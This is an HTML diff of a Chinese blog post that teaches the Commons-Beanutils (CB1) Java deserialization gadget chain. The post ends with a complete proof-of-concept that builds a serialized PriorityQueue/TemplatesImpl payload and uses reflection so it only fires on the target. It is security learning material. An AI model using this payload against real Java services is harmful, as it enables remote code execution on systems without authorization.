@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
   
-  <meta name="robots" content="noindex,follow">
+  
   <meta name="generator" content="Hexo 8.1.1">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
@@ -17,15 +17,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>归档 - Yu9991n9的博客</title>
+  <title>CB链 - Yu9991n9的博客</title>
 
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="归档">
-<meta property="og:url" content="https://yu9991n9.github.io/archives/2026/07/">
+    <meta name="description" content="简介CB链相比之下是一个比较简单的链子了，简单来说就是BeanComarator类下有个compare方法，它需要两个对象，然后会根据我们在实例化BeanComparator时给构造方法传的参去两个实例化对象中对应取出来，而TemplatesImpl类的getOutputProperties方法会调用newTransformer，然后剩下的其实就和cck1一样了 原理首先就是为什么要叫做CB链，其">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CB链">
+<meta property="og:url" content="https://yu9991n9.github.io/2026/08/26/CB%E9%93%BE/">
 <meta property="og:site_name" content="Yu9991n9的博客">
+<meta property="og:description" content="简介CB链相比之下是一个比较简单的链子了，简单来说就是BeanComarator类下有个compare方法，它需要两个对象，然后会根据我们在实例化BeanComparator时给构造方法传的参去两个实例化对象中对应取出来，而TemplatesImpl类的getOutputProperties方法会调用newTransformer，然后剩下的其实就和cck1一样了 原理首先就是为什么要叫做CB链，其">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yu9991n9.github.io/images/avatar.jpg">
+<meta property="article:published_time" content="2026-08-26T15:44:00.000Z">
+<meta property="article:modified_time" content="2026-08-26T15:46:59.778Z">
 <meta property="article:author" content="Yu9991n9">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://yu9991n9.github.io/images/avatar.jpg">
@@ -44,12 +48,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://yu9991n9.github.io","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"name":"Yu9991n9的博客","description":"","url":"https://yu9991n9.github.io"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-08-26T23:44:00+08:00","dateModified":"2026-08-26T23:46:59+08:00","datePublished":"2026-08-26T23:44:00+08:00","description":"","headline":"CB链","mainEntityOfPage":{"@type":"WebPage","@id":"https://yu9991n9.github.io/2026/08/26/CB%E9%93%BE/"},"publisher":{"@type":"Organization","name":"Yu9991n9","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://yu9991n9.github.io/2026/08/26/CB%E9%93%BE/","image":[]}</script>
   
 </head>
 <body>
 
-<div class="l_body index" id="start" layout="undefined" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
@@ -61,21 +65,124 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
+
+
 <widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/08/26/CB%E9%93%BE/"><span class="title">CB链</span></a><a class="item title" href="/2026/08/26/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCCK1/"><span class="title">Shiro反序列化之CCK1</span></a><a class="item title" href="/2026/08/21/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><span class="title">HTTP请求走私</span></a><a class="item title" href="/2026/08/21/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">临时文件包含</span></a><a class="item title" href="/2026/08/21/sql%E5%86%99%E9%A9%AC/"><span class="title">sql写马</span></a><a class="item title" href="/2026/08/21/%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/"><span class="title">刷题小记</span></a><a class="item title" href="/2026/08/21/pearcmd/"><span class="title">pearcmd</span></a><a class="item title" href="/2026/08/21/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/"><span class="title">SQL注入进阶</span></a><a class="item title" href="/2026/08/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%83%A8%E5%88%86%E9%93%BE%E5%AD%90%EF%BC%88URLDNS,CC1,CC6)/"><span class="title">Java反序列化的部分链子（URLDNS、CC1、CC6）</span></a><a class="item title" href="/2026/03/18/%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E7%9A%84%E8%AE%B0%E5%BD%95/"><span class="title">部分刷题的记录</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Yu9991n9的博客</div></a></div></header>
-
- 
 
 
-<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a href="/">近期发布</a><a href="/categories/">分类</a><a class="active" href="/archives/">归档</a></nav></div></div></div><div class="post-list archives"><article class="" id="archive"><div class='archive-header h4'>2026</div><div class="archive-list"><a class='post fs14' href="/2026/08/26/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCCK1/"><time>08-26</time><span>Shiro反序列化之CCK1</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/26/CB%E9%93%BE/"><time>08-26</time><span>CB链</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"><time>08-21</time><span>HTTP请求走私</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><time>08-21</time><span>临时文件包含</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/sql%E5%86%99%E9%A9%AC/"><time>08-21</time><span>sql写马</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/%E5%88%B7%E9%A2%98%E5%B0%8F%E8%AE%B0/"><time>08-21</time><span>刷题小记</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/pearcmd/"><time>08-21</time><span>pearcmd</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/21/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/"><time>08-21</time><span>SQL注入进阶</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/08/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E9%83%A8%E5%88%86%E9%93%BE%E5%AD%90%EF%BC%88URLDNS,CC1,CC6)/"><time>08-16</time><span>Java反序列化的部分链子（URLDNS、CC1、CC6）</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/07/21/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"><time>07-21</time><span>宽字节注入</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/07/03/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"><time>07-03</time><span>无列名注入</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/06/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><time>06-29</time><span>Java安全漫谈学习笔记</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/06/24/java%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E5%8F%8D%E5%B0%84/"><time>06-24</time><span>Java安全前置：反射</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/05/13/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"><time>05-13</time><span>渗透之信息搜集</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/26/polar%E5%9B%B0%E9%9A%BE/"><time>03-26</time><span>Polar困难</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/18/%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E7%9A%84%E8%AE%B0%E5%BD%95/"><time>03-18</time><span>部分刷题的记录</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/12/%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87-wakeup/"><time>03-12</time><span>各版本绕过_wakeup()</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/08/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><time>03-08</time><span>session 文件包含</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"><time>03-02</time><span>[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></div><div class="archive-list"><a class='post fs14' href="/2026/01/25/polar%E4%B8%AD%E7%AD%89/"><time>01-25</time><span>Polar中等</span></a></div></article></div>
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/java-security/">java安全</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-08-26T15:44:00.000Z">2026-08-26</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-08-26T15:46:59.778Z">2026-08-26</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>CB链</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CB链相比之下是一个比较简单的链子了，简单来说就是BeanComarator类下有个compare方法，它需要两个对象，然后会根据我们在实例化BeanComparator时给构造方法传的参去两个实例化对象中对应取出来，而TemplatesImpl类的getOutputProperties方法会调用newTransformer，然后剩下的其实就和cck1一样了</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>首先就是为什么要叫做CB链，其实和CC链一样，这里我们要用的库是<code>Commons Beanutils</code> 库，然后在java当中存在一种书写规范叫做JavaBean，这个书写规范的要求简单一些来说就是：一个属性私有、有getter和setter，并且实现了Serializable的类</p>
+<p>假设我们有一个属性是name：</p>
+<p><strong>取值（Getter）：</strong> 方法名必须是 <code>get</code> 加上属性名（首字母大写），所以叫 <code>getName()</code>。</p>
+<p><strong>赋值（Setter）：</strong> 方法名必须是 <code>set</code> 加上属性名（首字母大写），所以叫 <code>setName()</code>。</p>
+<p>下面就是一个简要的符合javabean的类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line"></span><br><span class="line">        return name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line"></span><br><span class="line">        this.name = name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>CB库中提供了一个PropertyUtils.getProperty方法，让使用者可以直接调用任意Javabean的getter方法，getProperty方法</p>
+<p>需要两个参数，第一个参数就是类对象，第二个参数就是属性名</p>
+<p>此时，commons-beanutils会自动找到name属性的getter方法，也就是 getName ，然后调用，获得返回值</p>
+<p>说完上面的，接下来就是链子了，我们在CB链当中用的是CB中的，BeanComparator类，这个类有个compare方法：<br><img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1761819045139.png" alt="QQ_1761819045139"></p>
+<p>这个方法当中写到，如果我们传入的两个对象是null那就直接比较，但是如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值</p>
+<p>而在TemlatesImpl类当中的getOutputProperties方法当中也写到：</p>
+<p><img src="/images/java%E5%AE%89%E5%85%A8/CB%E9%93%BE/image-20260825011216705.png" alt="image-20260825011216705"></p>
+<p>那这里出现了newTransformer了，这不就和CCK1一样的吗，剩下的其实就是CCK1的东西了，这里就不多说了</p>
+<h1 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h1><p>最主要的就是这部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">pq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, bc);</span><br><span class="line"></span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setFieldValue(bc, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(pq, <span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl, tmpl&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这里的setFieldValue还是我们自己写的方法，和CCK1的时候一样。</p>
+<p>这里需要还需要学习以下的是PriorityQueque这是一个优先队列，那么这里为什么要用到这个类呢？</p>
+<p>我们从这个类的readObject()方法入手开始看：</p>
+<p><img src="/images/java%E5%AE%89%E5%85%A8/CB%E9%93%BE/image-20260826221307959.png" alt="image-20260826221307959"></p>
+<p>其实这个readObject方法里面写了很多，其中有一个queque数组，这个数组是PriorityQueque用来装数据的数组，和我们这条链子有关系的就只有最后一句heapify():我们跟进一下：</p>
+<p><img src="/images/java%E5%AE%89%E5%85%A8/CB%E9%93%BE/image-20260826222151220.png" alt="image-20260826222151220"></p>
+<p>我们看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((cmp = comparator) == null)</span><br></pre></td></tr></table></figure>
+
+<p>这个就是在查这个队列有没有自带比较器，这里的比较器其实就是我们在实例化时给构造方法传参时传进去的类有没有实现Comparator接口，而我们传进去的这个类就需要在Priority当中充当一个裁判的作用。</p>
+<p>明显我们通过代码也看的出来这里我们是有比较器的，那么就会往</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siftDownUsingComparator(i, (E) es[i], es, n, cmp);</span><br></pre></td></tr></table></figure>
+
+<p>我们跟进一下：<br><img src="/images/java%E5%AE%89%E5%85%A8/CB%E9%93%BE/image-20260826223734858.png" alt="image-20260826223734858"></p>
+<p>这里面的x和c就是在es提取出来的具体元素，而es就是queque数组，cmp就是我们传的BeanComparator</p>
+<p>仔细看截图里的 <code>while</code> 循环，里面有两次极其致命的函数调用：</p>
+<ul>
+<li><strong>第一处</strong>：<code>if (right &lt; n &amp;&amp; cmp.compare((T) c, (T) es[right]) &gt; 0)</code></li>
+<li><strong>第二处</strong>：<code>if (cmp.compare(x, (T) c) &lt;= 0)</code></li>
+</ul>
+<p>这里我们可以看见执行了比较器的Compare方法，上面我们又说了BeanComparator类的Compare方法会去调用CB库底层的PropertyUtils.getProperty从而进一步去调用getter，而我们说了getOutputProperties方法会调用newTransformer方法，此时就形成了完整的链子了。</p>
+<p>那么我们回到代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">pq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, bc);</span><br><span class="line"></span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setFieldValue(bc, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(pq, <span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl, tmpl&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>第一句实例化我们的比较器，第二句实例化我们的PropertyQueque，并且给构造方法传参，意思是创造一个有两个元素的队列，比较器是BeanComparator的实例。</p>
+<p>然后三四句就是我们往里面放元素，这里简要的概括一下优先队列当中的readObject的逻辑，它的逻辑简而言之就是如果这个队列有两个或者两个以上的元素就会把比较器拿出来比较一下方便排序，所以我们这里就塞两个没用的数据1进去，为什么这里要放1呢，其实还是怕我们构造的炸药提前就炸膛了。</p>
+<p>我们为了不炸膛就还是沿用我们一贯的方法，先瞎塞一个，然后后面再去给改回来</p>
+<ol>
+<li>替换比较器的目标属性</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(bc, &quot;property&quot;, &quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>在正式替换这行代码之前，我们通常会先通过 <code>pq.add(1)</code> 的方式，往队列里塞入两个无害的数字，目的是把队列的 <code>size</code> 撑到 2，以满足后续反序列化时触发排序比大小的条件。</p>
+<p><strong>如果不用反射，直接传参会怎样？</strong> 如果我们在最开始实例化比较器时，直接写成 <code>new BeanComparator(&quot;outputProperties&quot;)</code>，那么在后续执行 <code>pq.add(1)</code> 占位时，优先队列会自动触发内部排序。此时，比较器会去尝试获取数字 <code>1</code>（<code>Integer</code> 对象）的 <code>outputProperties</code> 属性。显然 <code>Integer</code> 类中不存在这个属性，程序会当场抛出 <code>NoSuchMethodException</code> 异常，导致 Payload 还没生成就直接崩溃了。</p>
+<p>因此，正确的做法是：先创建一个没有指定属性的“空壳”比较器骗过本地的排序机制，等占位完成后，再利用反射悄悄将底层变量 <code>property</code> 替换为真正的致命引信 <code>&quot;outputProperties&quot;</code>。</p>
+<ol start="2">
+<li>偷换队列底层的恶意对象</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(pq, &quot;queue&quot;, new Object[]&#123;tmpl, tmpl&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>此时，优先队列的架子已经搭好，里面的元素是之前用来占位的两个 <code>1</code>。接下来要把它们换成真正的恶意对象 <code>TemplatesImpl</code>（即 <code>tmpl</code>）。</p>
+<p><strong>为什么不能直接调用 <code>pq.add(tmpl)</code>？</strong> <code>PriorityQueue</code> 的 <code>add</code> 方法底层自带重排逻辑。如果我们通过正规的 <code>add</code> 方法向队列中添加恶意对象，队列在接收到数据的瞬间就会在<strong>本地环境</strong>触发比较器。此时比较器已经被我们改成了真引信，它会毫不犹豫地调用 <code>tmpl.getOutputProperties()</code>，直接导致咱们自己的电脑弹出了计算器，而真正的受害者毫发无损。</p>
+<p>为了绕过这个本地触发机制，我们必须放弃使用正常的 API，直接利用反射强行修改 <code>PriorityQueue</code> 底层用来存储数据的私有数组 <code>queue</code>，将原先装有 <code>[1, 1]</code> 的数组直接替换成装有 <code>[tmpl, tmpl]</code> 的新数组。</p>
+<p><strong>总结</strong> 通过这两次关键的反射操作，我们在本地内存中强行拼凑出了一个随时会爆炸的优先队列，但又完美绕过了所有会触发排序的正常方法。这个 Payload 在本地处于绝对休眠状态，只有当它被发送到目标服务器，并在目标的 <code>readObject</code> 流程中自动调用 <code>heapify()</code> 重新排序时，才会真正展露杀机。</p>
+<p>下面给出完整的poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Yu9991n9;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">bc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">pq</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, bc);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bc, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(pq, <span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl, tmpl&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(pq);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
